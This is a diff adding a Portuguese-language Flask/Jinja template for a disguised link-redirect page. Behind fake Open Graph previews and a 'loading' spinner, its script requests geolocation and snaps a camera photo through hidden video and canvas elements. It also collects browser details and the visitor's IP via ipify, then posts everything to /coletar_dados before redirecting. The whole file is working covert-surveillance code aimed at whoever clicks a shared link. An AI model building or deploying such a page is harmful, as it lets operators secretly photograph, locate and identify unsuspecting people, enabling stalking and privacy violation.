@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>{{ link.og_title or 'Redirecionando...' }}</title>
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="{{ link.og_title }}">
+    <meta property="og:description" content="{{ link.og_description }}">
+    <meta property="og:image" content="{{ url_for('static', filename='uploads/' + link.og_image, _external=True) }}">
+    <meta property="og:url" content="{{ request.url }}">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Delay para bots -->
+    <meta http-equiv="refresh" content="5;url={{ destino }}">
+    
+    <style>
+        body {
+            background-color: #0f172a;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        #spinner div {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3b82f6;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h3 {
+            margin-top: 20px;
+            font-weight: 400;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="spinner">
+        <div></div>
+    </div>
+    <h3 id="mensagem">Carregando... Aguarde alguns segundos.</h3>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const slug = {{ slug | tojson | safe }};
+        const destino = {{ destino | tojson | safe }};
+        const inicioTempo = Date.now();
+
+        const coletarInfoBrowser = async () => {
+            const userAgent = navigator.userAgent;
+            const idioma = navigator.language;
+            const fusoHorario = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const larguraTela = window.screen.width;
+            const alturaTela = window.screen.height;
+            const plataforma = navigator.platform;
+            const conexao = (navigator.connection || {}).effectiveType || "indisponível";
+
+            let ip = "indefinido";
+            try {
+                const ipRes = await fetch("https://api.ipify.org?format=json");
+                const ipJson = await ipRes.json();
+                ip = ipJson.ip;
+            } catch (e) {
+                console.warn("IP não obtido:", e);
+            }
+
+            return {
+                userAgent,
+                idioma,
+                fusoHorario,
+                larguraTela,
+                alturaTela,
+                plataforma,
+                conexao,
+                ip
+            };
+        };
+
+        async function coletarDados() {
+            let latitude = "", longitude = "", foto_base64 = "";
+
+            // Localização
+            try {
+                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+                latitude = pos.coords.latitude;
+                longitude = pos.coords.longitude;
+            } catch (e) {
+                console.warn("Erro na geolocalização:", e);
+            }
+
+            // Câmera
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                await new Promise(r => setTimeout(r, 2000)); // tempo da câmera ligar
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                foto_base64 = canvas.toDataURL("image/png");
+
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) {
+                console.warn("Erro ao acessar câmera:", e);
+            }
+
+            // Informações do navegador
+            const infosBrowser = await coletarInfoBrowser();
+
+            const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 1000);
+
+            const payload = {
+                slug,
+                latitude,
+                longitude,
+                foto_base64,
+                tempoSegundos,
+                ...infosBrowser
+            };
+
+            try {
+                const res = await fetch("/coletar_dados", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                const json = await res.json();
+                window.location.href = json.destino;
+            } catch (e) {
+                console.error("Erro ao enviar dados:", e);
+                document.getElementById('mensagem').innerText = "Erro ao enviar dados.";
+            }
+        }
+
+        coletarDados();
+    </script>
+</body>
+</html>
